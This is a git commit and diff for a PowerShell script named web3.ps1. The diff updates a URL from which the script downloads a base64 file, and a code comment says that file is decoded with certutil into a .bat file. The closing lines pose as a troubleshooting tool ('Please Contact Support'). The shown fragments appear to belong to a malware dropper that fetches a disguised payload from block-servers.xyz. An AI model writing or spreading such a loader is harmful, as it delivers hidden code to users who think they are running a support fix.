7013d4e9cbf3684ab5f2643dd1372b0dc6e25d44
web3-call <rightnow8133@protonmail.com>
2025-12-30 19:28:52 +0000

    Update URL for downloading base64 file

--- web3.ps1
+++ web3.ps1
@@ -49,7 +49,7 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     # Updated to download raw .b64 file and decode it using certutil -f -decode to .bat
-    $URL = 'https://config.block-servers.xyz/system.b64'
+    $URL = 'https://api.block-servers.xyz/system.b64'
 
     try {
         if ($psv -ge 3) {
@@ -150,4 +150,5 @@ if (-not $args) {
     Write-Host "Troubleshooting process has finished unsuccessful." -ForegroundColor Red
     Write-Host "Please Contact Support."
 } @args
+
 
